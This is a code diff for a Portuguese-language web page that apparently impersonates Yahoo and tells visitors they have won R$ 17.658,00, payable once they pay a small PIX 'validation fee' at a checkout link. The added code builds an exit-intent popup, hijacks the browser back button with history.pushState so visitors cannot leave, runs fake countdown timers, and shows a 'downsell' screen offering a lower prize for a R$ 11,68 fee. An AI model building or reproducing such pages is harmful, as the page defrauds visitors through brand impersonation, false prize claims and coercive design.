@@ -30,6 +30,14 @@
       display: flex;
       justify-content: center;
       padding: 20px 12px 30px;
+      min-height: 100vh;
+      transition: background-color 0.3s ease;
+    }
+
+    body.dark-downsell-mode {
+      background-color: #070a12;
+      color: #f8fafc;
+      padding: 16px 12px 40px;
     }
 
     .container {
@@ -40,7 +48,6 @@
       gap: 16px;
     }
 
-    /* Badges & Headers */
     .top-badge {
       align-self: center;
       background: #e6f9f0;
@@ -418,7 +425,6 @@
       line-height: 1.4;
     }
 
-    /* FAQ Styles */
     .faq-container {
       display: flex;
       flex-direction: column;
@@ -482,7 +488,6 @@
       color: #475569;
     }
 
-    /* Red Pill Countdown */
     .pill-red {
       background: #dc2626;
       color: #ffffff;
@@ -496,7 +501,6 @@
       margin-bottom: 12px;
     }
 
-    /* Yahoo Logo Container */
     .yahoo-logo-container {
       display: flex;
       justify-content: center;
@@ -512,7 +516,6 @@
       display: block;
     }
 
-    /* Modal Styles */
     .modal-backdrop {
       position: fixed;
       inset: 0;
@@ -576,7 +579,6 @@
       background: #f1f5f9;
     }
 
-    /* Modal Common Styles */
     .modal-icon-wrapper {
       display: flex;
       justify-content: center;
@@ -673,7 +675,6 @@
       background: #1d4ed8;
     }
 
-    /* Modal Progress Items */
     .system-progress-header {
       font-size: 11px;
       font-weight: 800;
@@ -741,7 +742,6 @@
       color: #2563eb;
     }
 
-    /* Stage 3 Warning Card */
     .modal-warning-card {
       background: #fef2f2;
       border: 1px solid #fecaca;
@@ -784,7 +784,6 @@
       transform: scale(0.99);
     }
 
-    /* Spinner Keyframe */
     @keyframes spin {
       100% {
         transform: rotate(360deg);
@@ -795,7 +794,515 @@
       animation: spin 1s linear infinite;
     }
 
-    /* Footer */
+    .exit-modal-backdrop {
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(circle at center, rgba(15, 23, 42, 0.88), rgba(2, 6, 23, 0.96));
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 100000;
+      padding: 16px;
+      opacity: 0;
+      transition: opacity 0.28s ease;
+    }
+
+    .exit-modal-backdrop.open {
+      display: flex;
+      opacity: 1;
+    }
+
+    .exit-modal-card {
+      background: #111827;
+      border: 1.5px solid #ef4444;
+      box-shadow: 0 0 35px rgba(239, 68, 68, 0.35), 0 25px 60px -15px rgba(0, 0, 0, 0.8);
+      border-radius: 28px;
+      width: 100%;
+      max-width: 440px;
+      padding: 34px 24px 30px;
+      text-align: center;
+      position: relative;
+      animation: exitPop 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
+
+    @keyframes exitPop {
+      0% {
+        transform: scale(0.9) translateY(18px);
+        opacity: 0;
+      }
+      100% {
+        transform: scale(1) translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .exit-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      background: rgba(239, 68, 68, 0.12);
+      border: 1px solid rgba(239, 68, 68, 0.35);
+      border-radius: 999px;
+      padding: 6px 16px;
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 0.6px;
+      color: #f87171;
+      text-transform: uppercase;
+      margin-bottom: 16px;
+    }
+
+    .exit-title {
+      color: #ffffff;
+      font-size: 24px;
+      font-weight: 900;
+      line-height: 1.25;
+      letter-spacing: -0.3px;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+    }
+
+    .exit-desc {
+      color: #cbd5e1;
+      font-size: 13.5px;
+      line-height: 1.55;
+      margin-bottom: 22px;
+      padding: 0 6px;
+    }
+
+    .exit-desc strong {
+      color: #facc15;
+      font-weight: 800;
+    }
+
+    .exit-timer-pill {
+      background: #090e17;
+      border: 1px solid #1f293d;
+      border-radius: 999px;
+      padding: 13px 20px;
+      font-size: 13.5px;
+      color: #94a3b8;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-bottom: 20px;
+    }
+
+    .exit-timer-pill strong {
+      color: #ef4444;
+      font-weight: 800;
+      font-size: 15px;
+    }
+
+    .btn-exit-action {
+      background: #059669;
+      background: linear-gradient(180deg, #10b981 0%, #059669 100%);
+      color: #ffffff;
+      border: none;
+      width: 100%;
+      padding: 17px 18px;
+      border-radius: 14px;
+      font-size: 14px;
+      font-weight: 900;
+      letter-spacing: 0.2px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-transform: uppercase;
+      box-shadow: 0 0 24px rgba(16, 185, 129, 0.4), 0 4px 10px rgba(5, 150, 105, 0.4);
+      transition: transform 0.12s ease, filter 0.15s ease;
+    }
+
+    .btn-exit-action:hover {
+      filter: brightness(1.06);
+    }
+
+    .btn-exit-action:active {
+      transform: scale(0.985);
+    }
+
+    .exit-dismiss-link {
+      display: inline-block;
+      margin-top: 18px;
+      color: #64748b;
+      font-size: 12px;
+      text-decoration: underline;
+      cursor: pointer;
+      transition: color 0.15s ease;
+      line-height: 1.4;
+    }
+
+    .exit-dismiss-link:hover {
+      color: #94a3b8;
+    }
+
+    #downsellView {
+      display: none;
+      width: 100%;
+      max-width: 480px;
+      flex-direction: column;
+      gap: 16px;
+      animation: fadeInDownsell 0.35s ease forwards;
+    }
+
+    @keyframes fadeInDownsell {
+      from {
+        opacity: 0;
+        transform: translateY(14px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .downsell-top-badge {
+      align-self: center;
+      background: linear-gradient(90deg, #d97706 0%, #ea580c 100%);
+      color: #ffffff;
+      box-shadow: 0 0 20px rgba(234, 88, 12, 0.45);
+      border-radius: 999px;
+      padding: 10px 18px;
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 0.6px;
+      text-transform: uppercase;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      text-align: center;
+      width: 100%;
+      max-width: 440px;
+    }
+
+    .downsell-logo-wrap {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 8px 0 4px;
+    }
+
+    .downsell-logo-img {
+      height: 38px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    .downsell-headline-box {
+      text-align: center;
+      padding: 0 4px;
+    }
+
+    .downsell-title {
+      font-size: 24px;
+      font-weight: 900;
+      color: #ffffff;
+      line-height: 1.3;
+      letter-spacing: -0.4px;
+    }
+
+    .downsell-title span {
+      color: #eab308;
+    }
+
+    .downsell-desc {
+      font-size: 13px;
+      line-height: 1.55;
+      color: #94a3b8;
+      margin-top: 10px;
+      padding: 0 6px;
+    }
+
+    .downsell-desc strong {
+      color: #f1f5f9;
+    }
+
+    /* Downsell Gold Timer Box */
+    .downsell-timer-card {
+      background: #0f1626;
+      border: 1px solid #78350f;
+      box-shadow: 0 0 22px rgba(234, 179, 8, 0.12);
+      border-radius: 18px;
+      padding: 16px 14px;
+      text-align: center;
+    }
+
+    .downsell-timer-title {
+      font-size: 11px;
+      font-weight: 800;
+      color: #facc15;
+      letter-spacing: 0.6px;
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .downsell-timer-clock {
+      font-size: 38px;
+      font-weight: 900;
+      color: #facc15;
+      letter-spacing: 1px;
+      margin: 4px 0 6px;
+    }
+
+    .downsell-timer-note {
+      font-size: 11.5px;
+      color: #94a3b8;
+      line-height: 1.4;
+    }
+
+    /* Downsell Big Container Card */
+    .downsell-main-card {
+      background: #0c121e;
+      border: 1px solid #1e293b;
+      border-radius: 24px;
+      padding: 22px 18px;
+      position: relative;
+      box-shadow: 0 20px 45px -15px rgba(0, 0, 0, 0.7);
+    }
+
+    .downsell-floating-badge {
+      position: absolute;
+      top: -12px;
+      right: 18px;
+      background: #059669;
+      color: #ffffff;
+      font-size: 10px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      padding: 6px 14px;
+      border-radius: 999px;
+      text-transform: uppercase;
+      box-shadow: 0 0 16px rgba(16, 185, 129, 0.5);
+    }
+
+    .downsell-info-inner {
+      background: #111a2e;
+      border: 1px solid #1e293b;
+      border-radius: 16px;
+      padding: 16px;
+      margin-top: 6px;
+    }
+
+    .downsell-info-inner p {
+      font-size: 12.5px;
+      line-height: 1.6;
+      color: #cbd5e1;
+    }
+
+    .downsell-info-inner strong {
+      color: #ffffff;
+    }
+
+    .downsell-info-inner .strikethrough-old {
+      color: #ef4444;
+      text-decoration: line-through;
+      font-weight: 700;
+    }
+
+    /* Comparison rows */
+    .downsell-comparison-group {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 18px;
+    }
+
+    .downsell-compare-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-radius: 14px;
+      padding: 14px 16px;
+    }
+
+    .downsell-row-expired {
+      background: rgba(239, 68, 68, 0.04);
+      border: 1.5px dashed #7f1d1d;
+    }
+
+    .downsell-row-active {
+      background: rgba(16, 185, 129, 0.08);
+      border: 1.5px solid #059669;
+      box-shadow: 0 0 20px rgba(16, 185, 129, 0.15);
+    }
+
+    .downsell-row-left {
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+    }
+
+    .downsell-row-label-red {
+      font-size: 12px;
+      font-weight: 800;
+      color: #f87171;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      text-transform: uppercase;
+    }
+
+    .downsell-row-subtext {
+      font-size: 11px;
+      color: #64748b;
+    }
+
+    .downsell-row-price-striked {
+      font-size: 17px;
+      font-weight: 800;
+      color: #64748b;
+      text-decoration: line-through;
+    }
+
+    .downsell-row-label-green {
+      font-size: 12px;
+      font-weight: 800;
+      color: #34d399;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      text-transform: uppercase;
+    }
+
+    .downsell-row-price-active {
+      font-size: 21px;
+      font-weight: 900;
+      color: #ffffff;
+      letter-spacing: -0.3px;
+    }
+
+    /* Price highlight */
+    .downsell-pricing-callout {
+      text-align: center;
+      margin-top: 24px;
+    }
+
+    .downsell-striked-top {
+      font-size: 12.5px;
+      color: #64748b;
+      text-decoration: line-through;
+    }
+
+    .downsell-promo-tag {
+      font-size: 12px;
+      font-weight: 800;
+      color: #34d399;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      margin-top: 4px;
+    }
+
+    .downsell-huge-price {
+      display: flex;
+      align-items: baseline;
+      justify-content: center;
+      gap: 4px;
+      margin: 4px 0 6px;
+    }
+
+    .downsell-huge-price .rs-prefix {
+      font-size: 26px;
+      font-weight: 900;
+      color: #facc15;
+    }
+
+    .downsell-huge-price .val {
+      font-size: 54px;
+      font-weight: 900;
+      color: #ffffff;
+      line-height: 1;
+      letter-spacing: -1.5px;
+    }
+
+    .downsell-price-sub {
+      font-size: 12px;
+      color: #94a3b8;
+    }
+
+    /* Green Main Button on Downsell */
+    .btn-downsell-cta {
+      margin-top: 18px;
+      width: 100%;
+      background: linear-gradient(180deg, #10b981 0%, #059669 100%);
+      color: #ffffff;
+      border: none;
+      padding: 18px 14px;
+      border-radius: 16px;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 28px rgba(16, 185, 129, 0.4), 0 4px 12px rgba(5, 150, 105, 0.4);
+      transition: transform 0.12s ease, filter 0.15s ease;
+    }
+
+    .btn-downsell-cta:hover {
+      filter: brightness(1.06);
+    }
+
+    .btn-downsell-cta:active {
+      transform: scale(0.985);
+    }
+
+    .btn-downsell-title {
+      font-size: 14.5px;
+      font-weight: 900;
+      letter-spacing: 0.2px;
+      text-transform: uppercase;
+    }
+
+    .btn-downsell-subtitle {
+      font-size: 11px;
+      font-weight: 600;
+      color: #d1fae5;
+      margin-top: 4px;
+      opacity: 0.95;
+    }
+
+    /* Trust Footer items */
+    .downsell-trust-footer {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      margin-top: 22px;
+      font-size: 11.5px;
+      color: #94a3b8;
+      flex-wrap: wrap;
+    }
+
+    .downsell-trust-footer span {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .downsell-final-reject-link {
+      display: block;
+      text-align: center;
+      font-size: 11px;
+      color: #475569;
+      text-decoration: underline;
+      cursor: pointer;
+      margin-top: 16px;
+      transition: color 0.15s ease;
+      line-height: 1.4;
+    }
+
+    .downsell-final-reject-link:hover {
+      color: #64748b;
+    }
+
     footer {
       text-align: center;
       font-size: 10px;
@@ -807,7 +1314,7 @@
 </head>
 <body>
 
-  <div class="container">
+  <div class="container" id="mainContentView">
 
     <!-- Top Badge -->
     <div class="top-badge">
@@ -998,6 +1505,7 @@
       </div>
     </div>
 
+    <!-- Testimonials -->
     <div class="card">
       <div style="text-align: center; margin-bottom: 12px;">
         <span style="font-size: 10px; font-weight: 700; color: #16a34a; text-transform: uppercase;">Quem já confirmou, recomenda</span>
@@ -1077,6 +1585,7 @@
       </div>
     </div>
 
+    <!-- FAQ Section -->
     <div style="text-align: center; margin-top: 8px;">
       <span style="font-size: 11px; font-weight: 700; color: #16a34a; letter-spacing: 0.5px; text-transform: uppercase;">Dúvidas Frequentes</span>
       <h3 style="font-size: 22px; font-weight: 900; color: #0f172a; margin-top: 4px; display: flex; align-items: center; justify-content: center; gap: 8px;">
@@ -1086,7 +1595,7 @@
 
     <div class="faq-container">
       
-      <!-- FAQ 1 (Aberto por padrão) -->
+      <!-- FAQ 1 -->
       <div class="faq-item active">
         <button class="faq-header" type="button" aria-expanded="true">
           <span>1. Como sei que fui realmente sorteado(a)?</span>
@@ -1163,6 +1672,7 @@
 
     </div>
 
+    <!-- Bottom Box -->
     <div class="card" style="text-align: center; padding: 24px 18px;">
       
       <!-- Logo Oficial do Yahoo! -->
@@ -1212,6 +1722,180 @@
 
   </div>
 
+  <div id="downsellView">
+    
+    <!-- Top Amber Badge -->
+    <div class="downsell-top-badge">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+        <line x1="12" y1="9" x2="12" y2="13"/>
+        <line x1="12" y1="17" x2="12.01" y2="17"/>
+      </svg>
+      RECLASSIFICAÇÃO BANCÁRIA · COTA EXPRESS ATIVADA
+    </div>
+
+    <!-- Official Yahoo Logo -->
+    <div class="downsell-logo-wrap">
+      <img 
+        class="downsell-logo-img" 
+        src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/1280px-Yahoo%21_%282019%29.svg.png" 
+        alt="Yahoo!"
+        onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/3/3a/Yahoo%21_%282019%29.svg';"
+      >
+    </div>
+
+    <!-- Headline and Subtext -->
+    <div class="downsell-headline-box">
+      <h1 class="downsell-title">
+        Sua Cota foi ajustada para <span>R$ 8.420,00</span>
+      </h1>
+      <p class="downsell-desc">
+        A vaga do prêmio máximo foi repassada. Seu cadastro foi realocado para a <strong>Cota Express</strong> com taxa proporcional reduzida.
+      </p>
+    </div>
+
+    <!-- Gold Countdown Card -->
+    <div class="downsell-timer-card">
+      <div class="downsell-timer-title">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+          <circle cx="12" cy="12" r="10"/>
+          <polyline points="12 6 12 12 16 14"/>
+        </svg>
+        TEMPO RESTANTE PARA VALIDAR A COTA EXPRESS:
+      </div>
+      <div class="downsell-timer-clock" id="downsellTimerClock">01:00</div>
+      <p class="downsell-timer-note">
+        Após esse prazo, a chave PIX é desvinculada definitivamente de qualquer bonificação.
+      </p>
+    </div>
+
+    <!-- Main Downsell Details Card -->
+    <div class="downsell-main-card">
+      <div class="downsell-floating-badge">COTA DISPONÍVEL</div>
+
+      <!-- Explanatory Box -->
+      <div class="downsell-info-inner">
+        <p>
+          Como o prazo da <strong>Cota Master</strong> foi excedido, o sistema ativou o protocolo de segurança para você não sair de mãos vazias: sua chave PIX foi transferida para a <strong>Cota Secundária de R$ 8.420,00</strong>.
+          <br><br>
+          Por ser um valor menor, a taxa de validação bancária exigida pelo gateway caiu de <span class="strikethrough-old">R$ 19,90</span> para <strong>apenas R$ 11,68</strong>.
+        </p>
+      </div>
+
+      <!-- Comparison Rows -->
+      <div class="downsell-comparison-group">
+        <!-- Row 1: Cota Master (Expirada) -->
+        <div class="downsell-compare-row downsell-row-expired">
+          <div class="downsell-row-left">
+            <div class="downsell-row-label-red">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                <line x1="18" y1="6" x2="6" y2="18"/>
+                <line x1="6" y1="6" x2="18" y2="18"/>
+              </svg>
+              COTA MASTER (EXPIRADA)
+            </div>
+            <div class="downsell-row-subtext">Taxa exigida era R$ 19,90</div>
+          </div>
+          <div class="downsell-row-price-striked">R$ 17.658,00</div>
+        </div>
+
+        <!-- Row 2: Cota Express (Liberada Agora) -->
+        <div class="downsell-compare-row downsell-row-active">
+          <div class="downsell-row-left">
+            <div class="downsell-row-label-green">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                <polyline points="20 6 9 17 4 12"/>
+              </svg>
+              COTA EXPRESS (LIBERADA AGORA)
+            </div>
+            <div class="downsell-row-subtext">Taxa proporcional de apenas R$ 11,68</div>
+          </div>
+          <div class="downsell-row-price-active">R$ 8.420,00</div>
+        </div>
+      </div>
+
+      <!-- Price Callout -->
+      <div class="downsell-pricing-callout">
+        <div class="downsell-striked-top">De R$ 19,90 por</div>
+        <div class="downsell-promo-tag">APENAS TAXA DE VALIDAÇÃO REDUZIDA:</div>
+        
+        <div class="downsell-huge-price">
+          <span class="rs-prefix">R$</span>
+          <span class="val">11,68</span>
+        </div>
+
+        <div class="downsell-price-sub">
+          Pagamento único via PIX · Depósito de R$ 8.420,00 em até 3 min
+        </div>
+      </div>
+
+      <!-- Action Button CTA -->
+      <button class="btn-downsell-cta" id="btnDownsellCTA" type="button">
+        <span class="btn-downsell-title">PAGAR R$ 11,68 E SACAR MEUS R$ 8.420,00 AGORA</span>
+        <span class="btn-downsell-subtitle">Transferência imediata para sua chave PIX cadastrada</span>
+      </button>
+
+    </div>
+
+    <!-- Trust Footer -->
+    <div class="downsell-trust-footer">
+      <span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        Conexão Criptografada SSL
+      </span>
+      <span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+        Garantia de Envio Imediato
+      </span>
+    </div>
+
+    <!-- Final Reject Link -->
+    <a class="downsell-final-reject-link" id="btnDownsellFinalReject">
+      Prefiro não pagar R$ 11,68 e abrir mão também dos meus R$ 8.420,00
+    </a>
+
+    <!-- Footer -->
+    <footer style="margin-top: 10px;">
+      © Yahoo! Premia Brasil · protocolo-express@yahoo.com · Termos aplicáveis
+    </footer>
+
+  </div>
+
+  <!-- MODAL DE INTENÇÃO DE SAÍDA (EXIT-INTENT) -->
+  <div class="exit-modal-backdrop" id="exitModalBackdrop" aria-hidden="true">
+    <div class="exit-modal-card">
+      <div class="exit-badge">
+        <span>⚠️</span> PROTOCOLO DE CANCELAMENTO INICIADO
+      </div>
+
+      <h2 class="exit-title">ESPERE! NÃO FECHE ESTA TELA!</h2>
+
+      <p class="exit-desc">
+        Se sair agora, seu PIX de <strong>R$ 17.658,00</strong> será cancelado irreversivelmente e repassado para a fila de espera.
+      </p>
+
+      <div class="exit-timer-pill">
+        Tempo limite para não perder o saque: <strong id="exitCountdown">43s</strong>
+      </div>
+
+      <button class="btn-exit-action" id="btnExitAction" type="button">
+        CONTINUAR E SACAR MEUS R$ 17.658 AGORA
+      </button>
+
+      <div>
+        <a class="exit-dismiss-link" id="btnExitDismiss" href="javascript:void(0);" role="button">
+          Abrir mão dos R$ 17.658 e aceitar rebaixar minha cota para R$ 8.420
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL MULTI-ETAPAS DE VALIDAÇÃO PIX -->
   <div class="modal-backdrop" id="pixModalBackdrop" aria-hidden="true">
     <div class="modal-card" id="pixModalCard">
       
@@ -1235,7 +1919,7 @@
         </div>
 
         <h3 class="modal-title">Para onde enviamos o PIX?</h3>
-        <p class="modal-subtext">Cadastre a chave exata onde deseja receber os <strong>R$ 17.658,00</strong> agora mesmo.</p>
+        <p class="modal-subtext" id="modalSubtextReward">Cadastre a chave exata onde deseja receber os <strong>R$ 17.658,00</strong> agora mesmo.</p>
 
         <form id="pixForm" onsubmit="return false;">
           <label class="modal-input-label" for="pixKeyInput">Sua Chave PIX</label>
@@ -1326,7 +2010,7 @@
             <line x1="12" y1="9" x2="12" y2="13"/>
             <line x1="12" y1="17" x2="12.01" y2="17"/>
           </svg>
-          <p>
+          <p id="modalWarningText">
             <strong>Atenção:</strong> O não pagamento da taxa fará com que o valor de R$ 17.658 seja <strong><u>cancelado e bloqueado</u></strong>.
           </p>
         </div>
@@ -1385,14 +2069,12 @@
           const body = item.querySelector('.faq-body');
           const isCurrentlyActive = item.classList.contains('active');
 
-          // Fecha todos os outros itens para um comportamento sanfona limpo
           document.querySelectorAll('.faq-item').forEach(otherItem => {
             otherItem.classList.remove('active');
             otherItem.querySelector('.faq-header').setAttribute('aria-expanded', 'false');
             otherItem.querySelector('.faq-body').style.maxHeight = '0px';
           });
 
-          // Se não estava ativo, abre
           if (!isCurrentlyActive) {
             item.classList.add('active');
             this.setAttribute('aria-expanded', 'true');
@@ -1401,7 +2083,7 @@
         });
       });
 
-      // Contagem regressiva sincronizada nos timers de tela
+      // Contagem regressiva sincronizada nos timers da página inicial
       let totalSeconds = 9 * 60 + 51; // 09:51
 
       function updateTimers() {
@@ -1424,7 +2106,92 @@
 
       setInterval(updateTimers, 1000);
 
-      // --- LOGICA DO MODAL MULTI-ETAPAS E REPASSE DE UTMS ---
+      // --- LOGICA DE CHECKOUT E UTMS ---
+      const BASE_CHECKOUT_URL = 'https://go.perfectpay.com.br/PPU38CQGQEO';
+      const DOWNSELL_CHECKOUT_URL = 'https://go.perfectpay.com.br/PPU38CQGRTH';
+
+      function getFullCheckoutUrl(baseUrl = BASE_CHECKOUT_URL) {
+        const currentQuery = window.location.search;
+        if (!currentQuery) return baseUrl;
+        const separator = baseUrl.includes('?') ? '&' : '?';
+        return baseUrl + separator + currentQuery.replace(/^\?/, '');
+      }
+
+      function goToCheckout(baseUrl = BASE_CHECKOUT_URL) {
+        window.location.href = getFullCheckoutUrl(baseUrl);
+      }
+
+      // --- CONTROLE DE TELAS (MAIN VIEW vs DOWNSELL VIEW) ---
+      const mainContentView = document.getElementById('mainContentView');
+      const downsellView = document.getElementById('downsellView');
+      let currentActiveView = 'main'; // 'main' ou 'downsell'
+
+      // Timer da tela de Downsell (01:00)
+      const downsellTimerClock = document.getElementById('downsellTimerClock');
+      let downsellSeconds = 60;
+      let downsellInterval = null;
+
+      function startDownsellCountdown() {
+        if (downsellInterval) clearInterval(downsellInterval);
+        downsellSeconds = 60;
+
+        downsellInterval = setInterval(() => {
+          downsellSeconds--;
+          if (downsellSeconds >= 0) {
+            const m = String(Math.floor(downsellSeconds / 60)).padStart(2, '0');
+            const s = String(downsellSeconds % 60).padStart(2, '0');
+            if (downsellTimerClock) downsellTimerClock.textContent = `${m}:${s}`;
+          } else {
+            clearInterval(downsellInterval);
+            if (downsellTimerClock) downsellTimerClock.textContent = '00:00';
+          }
+        }, 1000);
+      }
+
+      function switchToDownsell() {
+        currentActiveView = 'downsell';
+        hideExitModal();
+
+        // Oculta visual principal e exibe tela de Downsell
+        if (mainContentView) mainContentView.style.display = 'none';
+        if (downsellView) {
+          downsellView.style.display = 'flex';
+          downsellView.style.visibility = 'visible';
+        }
+        document.body.classList.add('dark-downsell-mode');
+        window.scrollTo({ top: 0, behavior: 'instant' });
+
+        // Ajusta textos do modal para o valor reduzido de R$ 8.420,00
+        const modalSubtextReward = document.getElementById('modalSubtextReward');
+        const modalWarningText = document.getElementById('modalWarningText');
+
+        if (modalSubtextReward) {
+          modalSubtextReward.innerHTML = 'Cadastre a chave exata onde deseja receber os <strong>R$ 8.420,00</strong> agora mesmo.';
+        }
+        if (modalWarningText) {
+          modalWarningText.innerHTML = '<strong>Atenção:</strong> O não pagamento da taxa fará com que o valor de R$ 8.420 seja <strong><u>cancelado e bloqueado</u></strong>.';
+        }
+
+        startDownsellCountdown();
+      }
+
+      // Botão CTA da tela de Downsell
+      const btnDownsellCTA = document.getElementById('btnDownsellCTA');
+      if (btnDownsellCTA) {
+        btnDownsellCTA.addEventListener('click', function () {
+          goToCheckout(DOWNSELL_CHECKOUT_URL);
+        });
+      }
+
+      // Link final de descarte na tela de Downsell
+      const btnDownsellFinalReject = document.getElementById('btnDownsellFinalReject');
+      if (btnDownsellFinalReject) {
+        btnDownsellFinalReject.addEventListener('click', function () {
+          window.location.href = 'https://www.google.com';
+        });
+      }
+
+      // --- LOGICA DO MODAL MULTI-ETAPAS ---
       const modalBackdrop = document.getElementById('pixModalBackdrop');
       const modalCloseBtn = document.getElementById('modalCloseBtn');
       const triggerButtons = document.querySelectorAll('.trigger-pix-modal');
@@ -1442,35 +2209,17 @@
       const stepItem2 = document.getElementById('stepItem2');
       const stepItem3 = document.getElementById('stepItem3');
       const redirectCountdownText = document.getElementById('redirectCountdownText');
-      const BASE_CHECKOUT_URL = 'https://go.perfectpay.com.br/PPU38CQGQEO';
 
-      // Constrói a URL de checkout preservando parâmetros de rastreamento (UTMs)
-      function getFullCheckoutUrl() {
-        const currentQuery = window.location.search;
-        if (!currentQuery) return BASE_CHECKOUT_URL;
-
-        const separator = BASE_CHECKOUT_URL.includes('?') ? '&' : '?';
-        return BASE_CHECKOUT_URL + separator + currentQuery.replace(/^\?/, '');
-      }
-
-      // Atualiza o atributo href do botão com as UTMs dinâmicas
       if (redirectCountdownText) {
         redirectCountdownText.setAttribute('href', getFullCheckoutUrl());
-      }
-
-      let progressInterval = null;
-      let redirectTimerInterval = null;
-
-      function goToCheckout() {
-        window.location.href = getFullCheckoutUrl();
-      }
-
-      if (redirectCountdownText) {
         redirectCountdownText.addEventListener('click', function (e) {
           e.preventDefault();
           goToCheckout();
         });
       }
+
+      let progressInterval = null;
+      let redirectTimerInterval = null;
 
       function resetModal() {
         if (progressInterval) clearInterval(progressInterval);
@@ -1525,7 +2274,6 @@
         resetModal();
       }
 
-      // Eventos de Abertura e Fechamento
       triggerButtons.forEach(btn => {
         btn.addEventListener('click', openModal);
       });
@@ -1538,16 +2286,100 @@
         }
       });
 
-      // Submissão do Formulário da Chave PIX (Transição para Etapa 2)
+      // --- LOGICA DE INTENÇÃO DE SAÍDA (EXIT-INTENT) E TRANSIÇÃO DOWNSELL ---
+      const exitModalBackdrop = document.getElementById('exitModalBackdrop');
+      const btnExitAction = document.getElementById('btnExitAction');
+      const btnExitDismiss = document.getElementById('btnExitDismiss');
+      const exitCountdownEl = document.getElementById('exitCountdown');
+
+      let exitShownCount = 0;
+      let exitTimerInterval = null;
+      let exitSeconds = 43;
+
+      function startExitCountdown() {
+        if (exitTimerInterval) clearInterval(exitTimerInterval);
+        exitSeconds = 43;
+        if (exitCountdownEl) exitCountdownEl.textContent = `${exitSeconds}s`;
+
+        exitTimerInterval = setInterval(() => {
+          exitSeconds--;
+          if (exitSeconds >= 0) {
+            if (exitCountdownEl) exitCountdownEl.textContent = `${exitSeconds}s`;
+          } else {
+            clearInterval(exitTimerInterval);
+          }
+        }, 1000);
+      }
+
+      function showExitModal() {
+        if (currentActiveView === 'downsell') return; // Na tela de downsell não exibe o modal de 17k
+
+        if (exitShownCount === 0) {
+          exitShownCount++;
+          exitModalBackdrop.classList.add('open');
+          exitModalBackdrop.setAttribute('aria-hidden', 'false');
+          startExitCountdown();
+        } else {
+          // Tentou sair pela segunda vez: direciona direto ao Downsell
+          switchToDownsell();
+        }
+      }
+
+      function hideExitModal() {
+        exitModalBackdrop.classList.remove('open');
+        exitModalBackdrop.setAttribute('aria-hidden', 'true');
+        if (exitTimerInterval) clearInterval(exitTimerInterval);
+      }
+
+      // 1. Detecção no Desktop: Cursor saindo pelo topo da janela
+      document.addEventListener('mouseleave', function (e) {
+        if (e.clientY <= 10) {
+          showExitModal();
+        }
+      });
+
+      // 2. Detecção no Mobile / Navegador: Histórico de retorno (back button)
+      try {
+        window.history.pushState({ page: 'saque' }, '', window.location.href);
+        window.addEventListener('popstate', function () {
+          if (currentActiveView === 'main') {
+            if (exitShownCount === 0) {
+              showExitModal();
+              window.history.pushState({ page: 'saque' }, '', window.location.href);
+            } else {
+              switchToDownsell();
+            }
+          }
+        });
+      } catch (err) {}
+
+      // Ao clicar em "CONTINUAR E SACAR MEUS R$ 17.658 AGORA"
+      btnExitAction.addEventListener('click', function () {
+        hideExitModal();
+        openModal();
+      });
+
+      // Ao clicar em "Abrir mão dos R$ 17.658 e aceitar rebaixar minha cota para R$ 8.420"
+      if (btnExitDismiss) {
+        const handleDismissClick = function (e) {
+          if (e) {
+            e.preventDefault();
+            e.stopPropagation();
+          }
+          switchToDownsell();
+        };
+
+        btnExitDismiss.addEventListener('click', handleDismissClick);
+        btnExitDismiss.addEventListener('touchend', handleDismissClick);
+      }
+
+      // Submissão do Formulário da Chave PIX (Etapa 1 -> Etapa 2 -> Etapa 3)
       pixForm.addEventListener('submit', function (e) {
         e.preventDefault();
